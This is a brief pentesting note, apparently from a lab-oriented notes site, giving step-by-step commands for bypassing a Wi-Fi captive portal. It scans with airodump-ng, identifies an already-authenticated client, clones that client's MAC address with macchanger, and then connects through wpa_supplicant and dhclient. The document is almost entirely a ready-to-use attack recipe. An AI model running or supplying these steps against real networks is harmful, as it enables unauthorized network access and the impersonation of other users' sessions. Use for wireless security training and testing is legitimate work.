---
title: Capative portal bypass
source_url: https://notes.incendium.rocks/pentesting-notes/wireless-networks/capative-portal-bypass
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: wireless
---

## 1. Discover

```bash
# Setup monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Scan networks & AP's
sudo airodump-ng wlan0mon
```

Pick target and check for capative portal:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2F0YWfWN7CUIvvFdnlt23s%2Fimage.png?alt=media&amp;token=0afec3c5-a2e0-462b-a74d-4d3b1737a5a5" alt=""><figcaption></figcaption></figure>

## 2. Find authenticated clients

```bash
sudo airodump-ng wlan0mon --band abg --bssid F0:9F:C2:71:22:10 -c 6
```

## 3. Change our own mac to authenticated mac

```bash
ip link set wlan2 down
macchanger -m b0:72:bf:44:b0:49 wlan2
ip link set wlan2 up
```

## 4. Connect to network

Once we know your ESSID we can connect to the network, for that we create a “free.conf’ file to connect from bash using “wpa\_supplicant”.

```bash
root@WiFiChallengeLab:~# cat free.conf
network={
	ssid="wifi-guest"
	key_mgmt=NONE
	scan_ssid=1
}
```

Start network

```bash
wpa_supplicant -Dnl80211 -iwlan2 -c free.conf
```

In another terminal as root (get IP):

```bash
dhclient wlan2 -v
```

Successfully bypassed!
